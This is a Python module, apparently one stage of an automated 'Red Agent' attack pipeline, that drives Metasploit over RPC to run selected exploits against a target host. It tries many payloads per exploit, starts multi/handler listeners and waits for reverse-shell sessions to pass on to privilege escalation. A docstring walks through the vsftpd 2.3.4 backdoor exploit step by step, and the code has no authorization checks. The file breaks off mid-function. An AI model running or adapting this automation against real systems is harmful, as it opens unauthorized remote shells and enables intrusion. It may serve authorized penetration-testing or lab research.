"""
Node 5: Exploit Execution & Session Management
Executes selected exploits with configured payloads and opens reverse shell sessions

â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
METASPLOIT CONSOLE COMMANDS - FOR MANUAL TESTING
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

After configuring the exploit and payload in Node 4, we need to EXECUTE it!
This is what Node 5 does automatically!

MANUAL APPROACH (what you would do in msfconsole):

1. LOAD THE EXPLOIT:
   msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
   msf6 exploit(unix/ftp/vsftpd_234_backdoor) >

2. SET THE PAYLOAD:
   msf6 exploit(...) > set PAYLOAD cmd/unix/interact
   PAYLOAD => cmd/unix/interact

3. SET TARGET:
   msf6 exploit(...) > set RHOSTS 192.168.1.100
   RHOSTS => 192.168.1.100

4. SET PAYLOAD OPTIONS:
   msf6 exploit(...) > set LHOST 192.168.1.50
   LHOST => 192.168.1.50
   msf6 exploit(...) > set LPORT 4444
   LPORT => 4444

5. RUN THE EXPLOIT:
   msf6 exploit(...) > exploit
   [*] Sending exploit...
   [+] Exploit completed, but no session was created.

6. CHECK FOR SESSIONS:
   msf6 exploit(...) > sessions -l
   Active sessions
   ===============
   Id  Type        Information                  Connection
   --  ----        -----------                  ----------
   1   shell cmd   Shell @ 192.168.1.100        192.168.1.100 -> 192.168.1.50:4444

NODE 5 AUTOMATES THIS ENTIRE PROCESS!
   - For each exploit (Node 3 selected 8):
       - For each payload (Node 4 prepared 10-15):
           - Load exploit module
           - Set RHOSTS (target IP)
           - Set payload + LHOST/LPORT
           - Run exploit
           - Check for new sessions
           - If session opens: TRACK IT and move to Node 6
           - If no session: Try next payload
   - Track which payloads worked and which failed
   - Store session IDs for later use

WHY WE NEED THIS:
   - Exploits don't work without execution!
   - Single exploit might work with payload A, fail with payload B
   - Need to try multiple payloads until one succeeds
   - Need to track successful sessions for Node 6 (post-exploitation)
   - Need to log failures for debugging

â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
"""

from typing import Dict, List, Optional
import logging
import time
from datetime import datetime

# Import utilities
import sys
from pathlib import Path
sys.path.append(str(Path(__file__).parent.parent))

from ..utils.logging_setup import log_node_start, log_node_end


def node_5_exploit_execution(state: Dict) -> Dict:
    """
    Node 5: Execute selected exploits with configured payloads.

    â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
    PURPOSE - Why do we need Node 5? (Simple English)
    â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

    PROBLEM:
        Node 4 prepared EVERYTHING needed (exploit, payloads, LHOST, LPORT)
        But nothing has been EXECUTED yet!

        Questions:
            â“ Does the exploit actually work on the target?
            â“ Which payload will open a session?
            â“ Do we get a shell or meterpreter?
            â“ What if the first exploit fails?

        Example scenario from Node 4:
            âœ… Selected exploit: vsftpd_234_backdoor
            âœ… Payloads to try: [15 Linux payloads]
            âœ… LHOST: 192.168.1.50, LPORT: 4444
            âŒ But still NO SESSION! (exploit hasn't run yet)

    SOLUTION:
        Node 5 executes EVERYTHING and tracks results:
            1. For each exploit (TOP 8 selected):
            2. For each payload (10-15 prepared):
                - Load exploit in Metasploit
                - Configure all options (RHOSTS, LHOST, LPORT)
                - Execute exploit
                - Wait for session (timeout: 5-10 seconds)
                - If session opens: MARK AS SUCCESS
                - If no session: Try next payload
            3. Track successful + failed payloads
            4. Report results

    REAL-WORLD EXAMPLE:

        Before Node 5:
            Exploit: vsftpd_234_backdoor âœ…
            Payloads ready: 15 âœ…
            LHOST/LPORT: Configured âœ…
            Session: ??? âŒ (not opened yet)

        Node 5 Execution Flow:
            Exploit #1: vsftpd_234_backdoor
                Payload 1: cmd/unix/interact
                    â†’ Exploit runs
                    â†’ No session (timeout)
                    â†’ Mark as FAILED
                Payload 2: linux/x64/shell/reverse_tcp
                    â†’ Exploit runs
                    â†’ Session #1 opened! âœ…
                    â†’ Mark as SUCCESSFUL
                â†’ Move to next exploit (or stop if success!)

        After Node 5:
            Session #1: cmd shell, 192.168.1.100 â†’ 192.168.1.50:4444 âœ…
            successful_payloads: [
                {
                    "exploit": "vsftpd_234_backdoor",
                    "payload": "linux/x64/shell/reverse_tcp",
                    "session_id": 1,
                    "session_type": "shell"
                }
            ]
            failed_payloads: [
                {
                    "exploit": "vsftpd_234_backdoor",
                    "payload": "cmd/unix/interact",
                    "error": "Timeout - no session"
                }
            ]

    WHAT HAPPENS STEP-BY-STEP:

        Step 1: Get current exploit (from Node 4)
            current_exploit = state["selected_exploits"][0]

        Step 2: Get payloads to try (from Node 4)
            payloads = state["payloads_to_try"]

        Step 3: For each payload:
            a) Load exploit module in Metasploit
            b) Set RHOSTS = target IP
            c) Set PAYLOAD = current payload
            d) Set LHOST = attacker IP (reverse shell connection)
            e) Set LPORT = attacker port (reverse shell listener)
            f) Execute exploit (non-blocking)
            g) Wait for new session (max 5-10 seconds)
            h) If session opened: SUCCESS!
            i) If timeout: FAILURE, try next payload

        Step 4: If ANY payload succeeded:
            â†’ Move to Node 6 (Post-Exploitation)
            IF NO payload succeeded:
            â†’ Try next exploit (from Node 3's list of 8)

    WHY THIS MATTERS:

        Without Node 5:
            âŒ Exploits never executed
            âŒ No sessions opened
            âŒ Can't continue to post-exploitation
            âŒ Manual work: 5 minutes per exploit Ã— 8 exploits = 40 minutes!

        With Node 5:
            âœ… All exploits attempted automatically
            âœ… Multiple payloads tested per exploit
            âœ… Sessions tracked and verified
            âœ… Automatic fallback to next exploit
            âœ… Automatic: 2-3 minutes for all 8 exploits!

    ERROR HANDLING:

        âŒ No exploits to execute:
            - Log error: "selected_exploits list is empty"
            - Set state["error"] = "no_exploits_to_execute"
            - Return error state

        âŒ MSF client not found:
            - Log error: "Metasploit client lost connection"
            - Set state["error"] = "msf_client_lost"
            - Return error state

        âŒ Exploit execution timeout:
            - Log warning: "Exploit timed out, no session"
            - Mark payload as FAILED
            - Try next payload

        âŒ All payloads failed for exploit:
            - Log warning: "All payloads failed for this exploit"
            - Try next exploit (from backup list)

        âŒ All exploits failed:
            - Log error: "No exploits succeeded"
            - Set state["error"] = "all_exploits_failed"
            - Suggest alternative nodes (auxiliary, manual)

    STATE UPDATES:

        Input state (from Node 4):
            {
                "selected_exploits": [{exploit #1}, {exploit #2}, ...],
                "current_exploit_index": 0,
                "payloads_to_try": [10-15 payloads],
                "lhost": "192.168.1.50",
                "lport": 4567,
                "target": "192.168.1.100",
                "port": 21,
                "msf_client": <MsfRpcClient>,
                ...
            }

        Output state (after Node 5):
            {
                ...all previous state...
                "execution_attempts": 3,
                "successful_payloads": [
                    {
                        "exploit_path": "exploit/unix/ftp/vsftpd_234_backdoor",
                        "exploit_name": "VSFTPD 2.3.4 Backdoor",
                        "payload": "linux/x64/shell/reverse_tcp",
                        "session_id": 1,
                        "session_type": "shell",
                        "opened_at": <timestamp>
                    }
                ],
                "failed_payloads": [
                    {
                        "exploit_path": "exploit/unix/ftp/vsftpd_234_backdoor",
                        "payload": "cmd/unix/interact",
                        "error": "Timeout - no session"
                    },
                    ...
                ],
                "first_successful_exploit": {exploit #1 details},
                "first_successful_payload": "linux/x64/shell/reverse_tcp",
                "first_successful_session_id": 1
            }

    NEXT NODES:
        â†’ Node 6 (Session Management)
          Will manage the opened sessions and determine best one to use
        â†’ Node 7 (Privilege Escalation)
          Will attempt to escalate privileges using the shell session

    â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

    Args:
        state: Red Agent state dictionary (from Node 4)

    Returns:
        Updated state with execution results and opened sessions
    """

    logger = logging.getLogger("red_agent.node_5")

    # â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
    # STEP 0: Log node start
    # â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
    log_node_start(logger, "EXPLOIT EXECUTION & SESSION MANAGEMENT", 5)
    logger.info("=" * 70)

    # â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
    # STEP 1: Validate prerequisites
    # â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
    logger.info("STEP 1: Validating Prerequisites")
    logger.info("â”€" * 70)

    # Check if we have exploits to execute
    selected_exploits = state.get("selected_exploits", [])
    if not selected_exploits:
        logger.error("âŒ No exploits to execute!")
        logger.error("selected_exploits list is empty")
        state["error"] = "no_exploits_to_execute"
        log_node_end(logger, "NODE 5", success=False)
        return state

    logger.info(f"Found {len(selected_exploits)} exploits to try")

    # Check if we have payloads
    payloads_to_try = state.get("payloads_to_try", [])
    if not payloads_to_try:
        logger.error("âŒ No payloads to try!")
        state["error"] = "no_payloads_configured"
        log_node_end(logger, "NODE 5", success=False)
        return state

    logger.info(f"Found {len(payloads_to_try)} payloads to try per exploit")

    # Check MSF client
    msf_client = state.get("msf_client")
    if not msf_client:
        logger.error("âŒ Metasploit client not found!")
        logger.error("Node 1 should have connected to MSF RPC")
        state["error"] = "msf_client_not_found"
        log_node_end(logger, "NODE 5", success=False)
        return state

    logger.info("âœ… Metasploit client found")

    # Get required parameters
    target = state.get("target")
    port = state.get("port")
    lhost = state.get("lhost")
    lport = state.get("lport")

    if not all([target, port, lhost, lport]):
        logger.error("âŒ Missing required parameters!")
        logger.error(f"Target: {target}, Port: {port}, LHOST: {lhost}, LPORT: {lport}")
        state["error"] = "missing_parameters"
        log_node_end(logger, "NODE 5", success=False)
        return state

    logger.info(f"Target: {target}:{port}")
    logger.info(f"Listener: {lhost}:{lport}")
    logger.info("")

    # â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
    # STEP 2: Initialize tracking lists
    # â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
    logger.info("STEP 2: Initializing Tracking")
    logger.info("â”€" * 70)

    successful_payloads = state.get("successful_payloads", [])
    failed_payloads = state.get("failed_payloads", [])
    execution_attempts = 0

    logger.info("Initialized tracking for successful/failed payloads")
    logger.info("")

    # â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
    # STEP 3: CLEAR ALL EXISTING SESSIONS
    # â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
    logger.info("STEP 3: Clearing Existing Sessions")
    logger.info("â”€" * 70)

    try:
        all_sessions = msf_client.sessions.list
        if all_sessions:
            logger.info(f"Found {len(all_sessions)} existing sessions, killing them...")
            for session_id in list(all_sessions.keys()):
                try:
                    session_obj = msf_client.sessions.session(session_id)
                    session_obj.stop()
                    time.sleep(0.2)  # Brief pause between kills
                    logger.info(f"  âœ“ Killed session {session_id}")
                except Exception as e:
                    logger.warning(f"  âš ï¸  Could not kill session {session_id}: {e}")

            # Verify sessions are gone
            time.sleep(0.5)
            remaining = msf_client.sessions.list
            if remaining:
                logger.warning(f"âš ï¸  {len(remaining)} sessions still active after cleanup")
            else:
                logger.info("âœ“ All sessions cleared successfully")
        else:
            logger.info("No existing sessions to clear")
    except Exception as e:
        logger.warning(f"âš ï¸  Could not clear sessions: {e}")

    logger.info("")

    # â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
    # STEP 4: Get initial session count (should be 0 after clearing)
    # â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
    logger.info("STEP 4: Checking Initial Session Count")
    logger.info("â”€" * 70)

    try:
        initial_session_count = len(msf_client.sessions.list)
        logger.info(f"Current sessions before exploitation: {initial_session_count}")
    except Exception as e:
        logger.warning(f"âš ï¸  Could not get session count: {e}")
        initial_session_count = 0

    logger.info("")

    # â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
    # STEP 5: Execute exploits with payloads
    # â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
    logger.info("STEP 5: Executing Exploits")
    logger.info("â”€" * 70)

    current_exploit_index = state.get("current_exploit_index", 0)
    first_successful_exploit = None
    first_successful_payload = None
    first_successful_session_id = None

    # Try each exploit (up to 8 from Node 3)
    for exploit_idx, current_exploit in enumerate(selected_exploits[current_exploit_index:], current_exploit_index):
        exploit_path = current_exploit.get("path", "unknown")
        exploit_name = current_exploit.get("name", "Unknown")

        logger.info("")
        logger.info(f"EXPLOIT #{exploit_idx + 1}: {exploit_name}")
        logger.info(f"Path: {exploit_path}")
        logger.info("â”€" * 70)

        exploit_success = False

        # Try each payload for this exploit
        for payload_idx, payload in enumerate(payloads_to_try, 1):
            execution_attempts += 1
            logger.info(f"  Payload {payload_idx}/{len(payloads_to_try)}: {payload}")

            try:
                # â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
                # Load exploit module
                # â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
                try:
                    exploit_module = msf_client.modules.use('exploit', exploit_path)
                    logger.info(f"    âœ“ Loaded exploit module")
                except Exception as e:
                    logger.warning(f"    âœ— Failed to load exploit: {e}")
                    failed_payloads.append({
                        "exploit_path": exploit_path,
                        "exploit_name": exploit_name,
                        "payload": payload,
                        "error": f"Failed to load exploit: {str(e)}"
                    })
                    continue

                # â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
                # Set RHOSTS (target)
                # â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
                try:
                    exploit_module.runoptions["RHOSTS"] = target
                    logger.info(f"    âœ“ Set RHOSTS={target}")
                except Exception as e:
                    logger.warning(f"    âœ— Failed to set RHOSTS: {e}")
                    failed_payloads.append({
                        "exploit_path": exploit_path,
                        "exploit_name": exploit_name,
                        "payload": payload,
                        "error": f"Failed to set RHOSTS: {str(e)}"
                    })
                    continue

                # â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
                # Set payload
                # â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
                try:
                    exploit_module.runoptions["PAYLOAD"] = payload
                    logger.info(f"    âœ“ Set PAYLOAD={payload}")
                except Exception as e:
                    logger.warning(f"    âœ— Failed to set PAYLOAD: {e}")
                    failed_payloads.append({
                        "exploit_path": exploit_path,
                        "exploit_name": exploit_name,
                        "payload": payload,
                        "error": f"Failed to set PAYLOAD: {str(e)}"
                    })
                    continue

                # â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
                # Set LHOST (for reverse shells)
                # â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
                try:
                    exploit_module.runoptions["LHOST"] = lhost
                    logger.info(f"    âœ“ Set LHOST={lhost}")
                except Exception as e:
                    logger.warning(f"    âœ— Failed to set LHOST: {e}")
                    # Continue anyway - some payloads don't need LHOST

                # â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
                # Set LPORT (for reverse shells)
                # â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
                try:
                    exploit_module.runoptions["LPORT"] = lport
                    logger.info(f"    âœ“ Set LPORT={lport}")
                except Exception as e:
                    logger.warning(f"    âœ— Failed to set LPORT: {e}")
                    # Continue anyway - some payloads don't need LPORT

                # â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
                # Start multi/handler listener FIRST
                # â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
                logger.info(f"    ğŸ”§ Starting handler listener...")
                handler_job_id = None
                try:
                    # Load multi/handler
                    handler = msf_client.modules.use('exploit', 'multi/handler')
                    handler.runoptions['PAYLOAD'] = payload
                    handler.runoptions['LHOST'] = lhost
                    handler.runoptions['LPORT'] = lport
                    handler.runoptions['ExitOnSession'] = False  # Keep listening

                    # Execute handler in background
                    handler_result = handler.execute()
                    handler_job_id = handler_result.get('job_id')

                    if handler_job_id:
                        logger.info(f"    âœ“ Handler started (job_id: {handler_job_id})")
                    else:
                        logger.warning(f"    âš ï¸  Handler started but no job_id returned")

                    # Give handler time to start listening
                    time.sleep(2)

                except Exception as e:
                    logger.warning(f"    âš ï¸  Handler startup issue: {e}")
                    # Continue anyway - handler might still work

                # â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
                # Execute exploit
                # â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
                logger.info(f"    âš¡ Executing exploit...")
                try:
                    # Get current job count before execution
                    jobs_before = len(msf_client.jobs.list)

                    # Execute the exploit - this should create a background job
                    result = exploit_module.execute()

                    logger.info(f"    âœ“ Exploit executed (result: {result})")
                except Exception as e:
                    logger.warning(f"    âœ— Execution failed: {e}")
                    failed_payloads.append({
                        "exploit_path": exploit_path,
                        "exploit_name": exploit_name,
                        "payload": payload,
                        "error": f"Execution failed: {str(e)}"
                    })
                    continue

                # â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
                # Wait for new session
                # â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
                logger.info(f"    â³ Waiting for session (timeout: 15s)...")
                session_opened = False
                new_session_id = None

                for wait_attempt in range(15):  # 15 second timeout
                    time.sleep(1)

                    try:
                        current_sessions = msf_client.sessions.list
                        if len(current_sessions) > initial_session_count:
                            # New session opened!
                            session_opened = True

                            # Get the new session ID
                            for session_id, session_info in current_sessions.items():
                                if session_id not in [s.get("id") for s in successful_payloads]:
                                    new_session_id = session_id
                                    break

                            if new_session_id is None:
                                # Fallback: get latest session
                                new_session_id = max(current_sessions.keys(), default=None)

                            logger.info(f"    âœ… SESSION OPENED! (ID: {new_session_id})")
                            break

                    except Exception as e:
                        logger.debug(f"    Session check attempt {wait_attempt + 1} failed: {e}")
                        continue

                if session_opened:
                    # â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
                    # Session successful!
                    # â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
                    successful_payloads.append({
                        "exploit_path": exploit_path,
                        "exploit_name": exploit_name,
                        "payload": payload,
                        "session_id": new_session_id,
                        "session_type": "shell",
                        "opened_at": datetime.now().isoformat()
                    })

                    if first_successful_exploit is None:
                        first_successful_exploit = current_exploit
                        first_successful_payload = payload
                        first_successful_session_id = new_session_id

                    exploit_success = True
                    initial_session_count += 1  # Update count for next payload

                    # BREAK after first successful payload - no need to try others
                    break

                else:
                    # â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
                    # Session failed
                    # â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
                    logger.info(f"    âœ— Timeout - no session opened")
                    failed_payloads.append({
                        "exploit_path": exploit_path,
                        "exploit_name": exploit_name,
                        "payload": payload,
                        "error": "Timeout - no session"
                    })

            except Exception as e:
                logger.error(f"    âœ— Error: {e}")
                failed_payloads.append({
                    "exploit_path": exploit_path,
                    "exploit_name": exploit_name,
                    "payload": payload,
                    "error": f"Exception: {str(e)}"
                })

        # If this exploit succeeded, continue to next (try all exploits for robustness)
        if exploit_success:
            logger.info(f"âœ… Exploit #{exploit_idx + 1} succeeded!")
        else:
            logger.info(f"âŒ Exploit #{exploit_idx + 1} failed with all payloads")

    logger.info("")

    # â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
    # STEP 6: Report results
    # â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
    logger.info("STEP 6: Execution Results")
    logger.info("â”€" * 70)

    logger.info(f"Execution attempts: {execution_attempts}")
    logger.info(f"Successful payloads: {len(successful_payloads)}")
    logger.info(f"Failed payloads: {len(failed_payloads)}")

    if successful_payloads:
        logger.info("")
        logger.info("Successful sessions:")
        for sp in successful_payloads:
            logger.info(f"  â€¢ {sp['exploit_name']}")
            logger.info(f"    Payload: {sp['payload']}")
            logger.info(f"    Session ID: {sp['session_id']}")
    else:
        logger.warning("")
        logger.warning("âŒ No successful sessions!")
        logger.warning("All exploit/payload combinations failed")

    logger.info("")

    # â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
    # STEP 7: Update state
    # â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
    logger.info("STEP 7: Updating State")
    logger.info("â”€" * 70)

    state["execution_attempts"] = execution_attempts
    state["successful_payloads"] = successful_payloads
    state["failed_payloads"] = failed_payloads

    if first_successful_exploit:
        state["first_successful_exploit"] = first_successful_exploit
        state["first_successful_payload"] = first_successful_payload
        state["first_successful_session_id"] = first_successful_session_id
        # Also set primary_session_id for downstream nodes
        state["primary_session_id"] = first_successful_session_id
        state["primary_session_type"] = "shell"  # Node 5 opens basic shells
        logger.info(f"First successful exploit: {first_successful_exploit.get('name', 'Unknown')}")
        logger.info(f"First successful payload: {first_successful_payload}")
        logger.info(f"First session ID: {first_successful_session_id}")
    else:
        state["error"] = "all_exploits_failed"
        logger.error("No exploits succeeded")

    logger.info("")

    # â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
    # STEP 7: Log node completion
    # â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

    if successful_payloads:
